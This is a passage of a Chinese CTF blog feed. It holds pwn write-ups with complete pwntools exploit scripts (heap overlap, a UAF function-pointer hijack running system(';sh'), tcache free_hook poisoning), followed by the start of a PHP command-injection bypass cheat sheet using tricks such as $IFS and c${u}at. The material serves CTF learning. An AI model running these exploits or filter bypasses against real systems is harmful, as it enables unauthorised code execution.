class="hljs-number">0xf0</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;e&#x27;</span>*<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#can not fullfill it! otherwise it will change top chunk&#x27;s prev_inuse</span><br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">0xf0</span>+p64(<span class="hljs-number">0x300</span>))<br>free(<span class="hljs-number">0</span>) <br>free(<span class="hljs-number">3</span>) <span class="hljs-comment">#touch off merge</span><br><span class="hljs-comment"># p()</span><br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x200</span>,<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">6</span>)<br><span class="hljs-comment"># free(1)</span><br><br>show(<span class="hljs-number">3</span>)<br>leak=l64()<br>libc_base=leak-<span class="hljs-number">0x3c4f68</span><br>malloc_hook=libc_base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>og=libc_base+<span class="hljs-number">0x4527a</span><br>realloc=libc_base+libc.sym[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>]<br>target=malloc_hook-<span class="hljs-number">0x23</span><br><br>log.success(<span class="hljs-string">&quot;leak==&gt;%s&quot;</span>,<span class="hljs-built_in">hex</span>(leak))<br>log.success(<span class="hljs-string">&quot;libc_base==&gt;%s&quot;</span>,<span class="hljs-built_in">hex</span>(libc_base))<br>log.success(<span class="hljs-string">&quot;malloc_hook==&gt;%s&quot;</span>,<span class="hljs-built_in">hex</span>(malloc_hook))<br><span class="hljs-comment">#leak</span><br><br><span class="hljs-comment"># p()</span><br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;AAAA&#x27;</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;AAAA&#x27;</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;AAAA&#x27;</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;AAAA&#x27;</span>)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;AAAA&#x27;</span>)<br><br>free(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">b&#x27;e&#x27;</span>*<span class="hljs-number">0xf0</span>+p64(<span class="hljs-number">0x3f0</span>)) <span class="hljs-comment"># chunk5+chunk6+chunk7 = chunk8&#x27;s prev_size</span><br>free(<span class="hljs-number">5</span>) <span class="hljs-comment">#must free the first chunk </span><br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x78</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>) <span class="hljs-comment">#add from smallbin</span><br>free(<span class="hljs-number">8</span>) <span class="hljs-comment">#merge</span><br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x130</span>,<span class="hljs-string">&#x27;deadbeef&#x27;</span>)<br>free(<span class="hljs-number">6</span>) <span class="hljs-comment"># fastbin attack</span><br>edit(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0xf8</span>)+p64(<span class="hljs-number">0x70</span>)+p64(target))<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;BBBB&#x27;</span>)<br>add(<span class="hljs-number">11</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">11</span>+p64(og)+p64(realloc+<span class="hljs-number">8</span>))<br>sla(<span class="hljs-string">&quot;delete\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>sla(<span class="hljs-string">&quot;:\n&quot;</span>,<span class="hljs-string">&quot;12&quot;</span>)<br>sla(<span class="hljs-string">&quot;:\n&quot;</span>,<span class="hljs-string">&quot;20&quot;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure><h3 id="pwnable-hacknote"><a href="#pwnable-hacknote" class="headerlink" title="pwnable_hacknote"></a>pwnable_hacknote</h3><p>漏洞点：指针调用、劫持指针</p><p>例行检查，32位ELF，没开pie。</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220926193402657.png" class="" title="image-20220926193402657"><p>ida扫一遍，菜单，有增、删、查功能，限制申请堆块个数5个。</p><p>申请的时候会先申请一个note块，用于存放puts函数与content的地址，注意puts的地址是其他函数返回的：</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220926194926217.png" class="" title="image-20220926194926217"><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220926195000594.png" class="" title="image-20220926195000594"><p>如果我们申请一个堆块，结构是这样的：</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220926200527419.png" class="" title="image-20220926200527419"><p>红框内是note堆块，而下方是我们申请的堆块。note堆块里存放了puts函数的地址以及chunk的data区地址</p><p>同时注意到show函数处，使用的是指针调用，ptr</p><p>指向的就是note块的puts函数。</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220926193851959.png" class="" title="image-20220926193851959"><p>明显这里我们可以直接修改ptr的值，去调用其他函数。</p><p>delete处发现free之后指针没有置空，存在UAF</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220926193655270.png" class="" title="image-20220926193655270"><p>结合UAF，思路就明显了。</p><h4 id="泄露地址-2"><a href="#泄露地址-2" class="headerlink" title="泄露地址"></a>泄露地址</h4><p>首先我们申请两个0x20大小的堆块chunk0与chunk1，然后释放，note和chunk会分别进入0x10与0x20的fastbin。既然note和chunk会同时进入bin，那么如果我们申请大小为0x8的chunk，前一半0x8作为note后一半0x8作为content。这时候content就会直接覆盖chunk1的note(fastbin LIFO)，这时修改chunk1的note填入puts与free_got，在申请回来执行show(1)，就可以泄露free_got的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x20</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&quot;b&quot;</span>*<span class="hljs-number">0x20</span>) <span class="hljs-comment">#1</span><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x8</span>,p32(<span class="hljs-number">0x804862b</span>)+p32(<span class="hljs-number">0x804a018</span>)) <span class="hljs-comment">#2 func_puts + free_got</span><br>show(<span class="hljs-number">1</span>)<br>free_addr=u32(io.recv(<span class="hljs-number">4</span>))<br><br>libc_base=free_addr-libc.sym[<span class="hljs-string">&#x27;free&#x27;</span>]<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>log.success(<span class="hljs-string">&quot;free_got===&gt;%s\nsystem===&gt;%s&quot;</span>,<span class="hljs-built_in">hex</span>(free_addr),<span class="hljs-built_in">hex</span>(system))<br></code></pre></td></tr></table></figure><p>成功泄露</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220926224315090.png" class="" title="image-20220926224315090"><h4 id="getshell-1"><a href="#getshell-1" class="headerlink" title="getshell"></a>getshell</h4><p>同样的方法，我们将note中的put换成system，然后使用管道符 || sh 或者分隔符 ; sh 来使得程序执行下一步sh。</p><p>至于为什么不能是system(“&#x2F;bin&#x2F;sh”)，那是因为system的参数是固定为system的地址，即固定执行system(system_addr)，因此我们加入 管道符或者分号会忽略上一步的错误命令继续执行下一条。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># from LibcSearcher import *</span><br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;i386&#x27;</span><br>l64     = <span class="hljs-keyword">lambda</span>                    :u64(io.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;\x00&quot;</span>))<br>l32     = <span class="hljs-keyword">lambda</span>                    :u32(io.recvuntil(<span class="hljs-string">&quot;\xf7&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;\x00&quot;</span>))<br>s       = <span class="hljs-keyword">lambda</span> data               :io.send(<span class="hljs-built_in">str</span>(data))<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, <span class="hljs-built_in">str</span>(data))<br>sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(<span class="hljs-built_in">str</span>(data))<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, <span class="hljs-built_in">str</span>(data))<br>r       = <span class="hljs-keyword">lambda</span> num=<span class="hljs-number">4096</span>           :io.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>leak    = <span class="hljs-keyword">lambda</span> name,addr          :log.success(<span class="hljs-string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(name, addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">p</span>():<br>gdb.attach(io)<br>raw_input()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">choice</span>(<span class="hljs-params">i</span>):<br>sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,i)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>choice(<span class="hljs-number">1</span>)<br>sla(<span class="hljs-string">&#x27;size :&#x27;</span>,size)<br>sla(<span class="hljs-string">&#x27;Content :&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>choice(<span class="hljs-number">3</span>)<br>sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,index)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>choice(<span class="hljs-number">2</span>)<br>sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,index)<br><br><span class="hljs-comment"># io=process(&quot;./hacknote&quot;)</span><br>io=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">26410</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23-32.so&#x27;</span>)<br><br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x20</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&quot;b&quot;</span>*<span class="hljs-number">0x20</span>) <span class="hljs-comment">#1</span><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x8</span>,p32(<span class="hljs-number">0x804862b</span>)+p32(<span class="hljs-number">0x804a018</span>)) <span class="hljs-comment">#2 func_puts + free_got</span><br>show(<span class="hljs-number">1</span>)<br>free_addr=u32(io.recv(<span class="hljs-number">4</span>))<br><br>libc_base=free_addr-libc.sym[<span class="hljs-string">&#x27;free&#x27;</span>]<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>log.success(<span class="hljs-string">&quot;free_got===&gt;%s\nsystem===&gt;%s&quot;</span>,<span class="hljs-built_in">hex</span>(free_addr),<span class="hljs-built_in">hex</span>(system))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">libc = LibcSearcher(&quot;free&quot;, free_addr)</span><br><span class="hljs-string">libc_base=free_addr-libc.dump(&quot;free&quot;)</span><br><span class="hljs-string">system = libc_base + libc.dump(&quot;system&quot;)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">offset=libc.sym[&#x27;system&#x27;]-libc.sym[&#x27;free&#x27;] # got offset</span><br><span class="hljs-string">system=free_addr+offset</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x8</span>,p32(system)+<span class="hljs-string">b&quot;;sh&quot;</span>)<br><span class="hljs-comment"># gdb.attach(io,&quot;b *&#123;&#125;&quot;.format(hex(system)))</span><br><span class="hljs-comment"># p()</span><br>show(<span class="hljs-number">1</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220926225030991.png" class="" title="image-20220926225030991"><p>注：我在本地调试是打不通的，因为我的ubuntu是64位而程序是32位，所以地址差异的原因打不通。</p><h3 id="baigei"><a href="#baigei" class="headerlink" title="baigei"></a>baigei</h3><p><strong>libc-2.27</strong></p><p>程序逻辑漏洞，可二次修改堆块大小。</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20221001100742793.png" class="" title="image-20221001100742793"><p>puts(“error”)之前就已经给size赋值，且没有重复分配的检查，因此我们可以add(1,0x20),’aaaa’)，然后再add(1,0x1000)，把size改大，构造overlap泄露地址，最后就是简单的tcahebin-attack打free_hook。</p><blockquote><p>至于为什么不打malloc_hook，因为libc-2.27的tcache机制实际上使堆的利用更加简单的，fastbin大小的堆块free之后会先进入tcache bin，只有当tcache bin满了(最多容纳7个)才会计入fastbin。</p><p>tcache不会检查堆头，而free_hook附近全是空字节(fastbin attack需要0x7f)，因此直接拿tcache打很方便</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>io = process(<span class="hljs-string">&#x27;./main&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./main&#x27;</span>)<br><span class="hljs-comment">#libc = ELF(&#x27;./libc-2.27.so&#x27;)</span><br>libc = elf.libc<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">p</span>():<br>gdb.attach(io)<br>raw_input()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">choice</span>(<span class="hljs-params">c</span>):<br>io.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(c))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size,content</span>):<br>choice(<span class="hljs-number">1</span>)<br>io.recvuntil(<span class="hljs-string">&quot;?&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(idx))<br>io.recvuntil(<span class="hljs-string">&quot;?&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(size))<br>io.recvuntil(<span class="hljs-string">&quot;?&quot;</span>)<br>io.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,size,content</span>):<br>choice(<span class="hljs-number">3</span>)<br>io.recvuntil(<span class="hljs-string">&quot;?&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(idx))<br>io.recvuntil(<span class="hljs-string">&quot;?&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(size))<br>io.recvuntil(<span class="hljs-string">&quot;?&quot;</span>)<br>io.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>choice(<span class="hljs-number">4</span>)<br>io.recvuntil(<span class="hljs-string">&quot;?&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>choice(<span class="hljs-number">2</span>)<br>io.recvuntil(<span class="hljs-string">&quot;?&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fake_add</span>(<span class="hljs-params">idx,size</span>):<br>choice(<span class="hljs-number">1</span>)<br>io.recvuntil(<span class="hljs-string">&quot;?&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(idx))<br>io.recvuntil(<span class="hljs-string">&quot;?&quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(size))<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;AAAA&#x27;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;AAAA&#x27;</span>)<br><br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x400</span>,<span class="hljs-string">&#x27;AAAA&#x27;</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x200</span>,<span class="hljs-string">&#x27;AAAA&#x27;</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x200</span>,<span class="hljs-string">&#x27;AAAA&#x27;</span>)<br>fake_add(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;1111111111&#x27;</span>)<br><br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x621</span>))<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x400</span>,<span class="hljs-string">&#x27;A&#x27;</span>)<br>show(<span class="hljs-number">3</span>)<br>leak = u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>malloc_hook = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span><br>fh = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>success(<span class="hljs-built_in">hex</span>(libc_base))<br>success(<span class="hljs-built_in">hex</span>(fh))<br><span class="hljs-comment">#leak</span><br><br><br>fake_add(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;1111111&#x27;</span>)<br>free(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x20</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>)+p64(fh))<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x20</span>,p64(system))<br><br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x20</span>,p64(system))<br>p()<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>free(<span class="hljs-number">9</span>)<br><br><br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctf-php中的RceBypass</title>
    <link href="/2022/09/12/ctf-php%E4%B8%AD%E7%9A%84RceBypass/"/>
    <url>/2022/09/12/ctf-php%E4%B8%AD%E7%9A%84RceBypass/</url>
    
    <content type="html"><![CDATA[<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="php命令执行函数"><a href="#php命令执行函数" class="headerlink" title="php命令执行函数"></a>php命令执行函数</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">system</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">passthru</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">exec</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">shell_exec</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">popen</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">proc_open</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">pcntl_exec</span><span class="hljs-params">()</span></span><br>反引号`` 同<span class="hljs-built_in">shell_exec</span>() <br></code></pre></td></tr></table></figure><h3 id="管道符与元字符"><a href="#管道符与元字符" class="headerlink" title="管道符与元字符"></a>管道符与元字符</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-title class_">CR</span>：回车键&lt;ennter&gt;<br>=：设定变量<br><span class="hljs-variable">$：</span>作变量或运算替换<br>&gt;：重定向标准输入<br>&lt;：重定向标准输出<br>[<span class="hljs-symbol">:alnum</span><span class="hljs-symbol">:</span>]任意数字或者字母<br>[<span class="hljs-symbol">:alpha</span><span class="hljs-symbol">:</span>]任意字母<br>[<span class="hljs-symbol">:space</span><span class="hljs-symbol">:</span>]空格<br>[<span class="hljs-symbol">:lower</span><span class="hljs-symbol">:</span>]小写字母<br>[<span class="hljs-symbol">:digit</span><span class="hljs-symbol">:</span>]任意数字<br>[<span class="hljs-symbol">:upper</span><span class="hljs-symbol">:</span>]任意大写字母<br>[<span class="hljs-symbol">:cntrl</span><span class="hljs-symbol">:</span>]控制符<br>[<span class="hljs-symbol">:graph</span><span class="hljs-symbol">:</span>]图形<br>[<span class="hljs-symbol">:print</span><span class="hljs-symbol">:</span>]可打印字符<br>[<span class="hljs-symbol">:punct</span><span class="hljs-symbol">:</span>]标点符号<br>[<span class="hljs-symbol">:xdigit</span><span class="hljs-symbol">:</span>]十六进制数<br>[<span class="hljs-symbol">:blank</span><span class="hljs-symbol">:</span>]空白字符<br><br>&#124;：命令管道<br>&amp;：重导向文件描述符，或将命令静默执行  <span class="hljs-comment">#例如 java -jar test.jar&amp;代表后台运行</span><br>&#124;&#124;：前面的命令执行错误就执行后面的语句，否则只执行前面的语句<br>&amp;&amp;：前面的命令执行正确就执行后面的语句，否则只执行前面的语句<br>;：忽略前一个命令的返回值，继续执行下一条指令<br></code></pre></td></tr></table></figure><h3 id="空格的替换"><a href="#空格的替换" class="headerlink" title="空格的替换"></a>空格的替换</h3><h4 id="常规替换"><a href="#常规替换" class="headerlink" title="常规替换"></a>常规替换</h4><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mel">&lt;<br>&lt;&gt;<br>$IFS<br>$&#123;IFS&#125;<br>$IFS$(<span class="hljs-number">1</span><span class="hljs-number">-9</span>)  #从<span class="hljs-number">1</span>到<span class="hljs-number">9</span>，可以进行fuzz<br>&#123;cat,flag.txt&#125; <span class="hljs-comment">//花括号连接执行</span><br>%09<br>%20<br></code></pre></td></tr></table></figure><h4 id="u的妙用"><a href="#u的妙用" class="headerlink" title="$u的妙用"></a>$u的妙用</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span><span class="hljs-variable">$u</span>在Linux中代表的是空字符串(未初始化变量)，并不是代表是空格，我们可以将其随意插入到命令中，比如<br>c<span class="hljs-variable">$&#123;u&#125;</span>at index<span class="hljs-variable">$u</span>.php<span class="hljs-variable">$u</span><br>c`<span class="hljs-variable">$u</span>`at index<span class="hljs-variable">$u</span>.php<span class="hljs-variable">$u</span><br></code></pre></td></tr></table></figure><h4 id="命令提示符-绕过"><a href="#命令提示符-绕过" class="headerlink" title="命令提示符$绕过"></a>命令提示符$绕过</h4> <figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$*</span>、<span class="hljs-variable">$@</span>、<span class="hljs-variable">$x</span>（x=<span class="hljs-number">1</span>~<span class="hljs-number">9</span>）、<span class="hljs-variable">$&#123;</span>x&#125;（x&gt;<span class="hljs-number">9</span>)<br>在没有传参时，这些值都为空（<span class="hljs-variable">$0</span>表示shell本身的文件名，不可用）<br>例如：<br>ca<span class="hljs-variable">$*</span>t flag<br>ca<span class="hljs-variable">$@</span>t flag<br>ca<span class="hljs-variable">$7t</span> flag<br>ca<span class="hljs-variable">$&#123;</span><span class="hljs-number">18</span>&#125;t flag <br></code></pre></td></tr></table></figure><h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 